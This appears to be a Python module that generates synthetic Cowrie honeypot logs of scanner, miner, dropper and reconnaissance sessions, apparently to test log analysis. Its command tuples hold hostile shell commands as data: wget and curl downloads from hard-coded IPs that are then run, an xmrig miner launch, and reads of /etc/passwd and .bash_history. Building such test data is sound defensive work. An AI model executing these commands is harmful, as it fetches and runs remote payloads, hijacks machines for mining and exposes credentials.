from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .schema import to_iso8601

__all__ = ["write_synthetic_log"]

_SCANNER_CMDS = ("uname -a", "wget http://185.10.68.2/x", "chmod +x x", "./x")
_MINER_CMDS = (
    "nproc", "cat /proc/cpuinfo", "wget http://91.92.1.7/xmrig", "chmod +x xmrig",
    "./xmrig -o stratum+tcp://pool:3333 --donate-level 1", "pkill -9 minerd",
)
_DROPPER_CMDS = (
    "wget http://185.10.68.2/a", "curl -O http://185.10.68.2/b", "chmod +x a",
    "./a", "busybox wget http://185.10.68.2/c", "rm -rf a",
)
_RECON_CMDS = (
    "uname -a", "whoami", "id", "ls -la", "cat /etc/passwd", "ps aux",
    "netstat -an", "cat /proc/cpuinfo", "w", "cat /home/ubuntu/.bash_history",
)
_ARCHETYPES = (_SCANNER_CMDS, _MINER_CMDS, _DROPPER_CMDS, _RECON_CMDS)

_IPS = tuple(f"185.10.{a}.{b}" for a in range(1, 6) for b in (1, 50, 100))
_BASE_START = datetime(2024, 6, 1, tzinfo=timezone.utc)


def _synthetic_session_events(session_id: str, start: datetime, rng: random.Random) -> list[dict]:
    """Build the cowrie event stream for one synthetic session."""
    ip = rng.choice(_IPS)
    events: list[dict] = [
        {
            "eventid": "cowrie.session.connect",
            "session": session_id,
            "timestamp": to_iso8601(start),
            "src_ip": ip,
        }
    ]

    archetype = rng.choice(_ARCHETYPES)
    n_cmds = rng.randint(1, len(archetype))
    automated = rng.random() < 0.85  # matches real-world bot-dominated traffic
    cursor = start
    for cmd in rng.sample(archetype, k=n_cmds):
        gap_ms = rng.randint(50, 400) if automated else rng.randint(800, 6000)
        cursor = cursor + timedelta(milliseconds=gap_ms)
        events.append(
            {
                "eventid": "cowrie.command.input",
                "session": session_id,
                "timestamp": to_iso8601(cursor),
                "input": cmd,
            }
        )

    duration_s = (cursor - start).total_seconds() + rng.uniform(0.1, 1.0)
    events.append(
        {
            "eventid": "cowrie.session.closed",
            "session": session_id,
            "timestamp": to_iso8601(cursor),
            "duration": round(duration_s, 3),
        }
    )
    return events


def write_synthetic_log(path: str | Path, n_sessions: int = 400, seed: int = 0) -> Path:
    """Write a synthetic cowrie-format JSONL log with ``n_sessions`` sessions.

    Args:
        path: Output file path (created, overwritten if it already exists).
        n_sessions: Number of synthetic sessions to generate.
        seed: RNG seed for reproducibility.

    Returns:
        The path written to (same as ``path``, coerced to ``Path``).
    """
    rng = random.Random(seed)
    out_path = Path(path)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    with out_path.open("w", encoding="utf-8") as handle:
        for i in range(n_sessions):
            session_id = f"synthetic-{i:06d}"
            start = _BASE_START + timedelta(seconds=rng.randint(0, 30 * 24 * 3600))
            for event in _synthetic_session_events(session_id, start, rng):
                handle.write(json.dumps(event) + "\n")

    return out_path
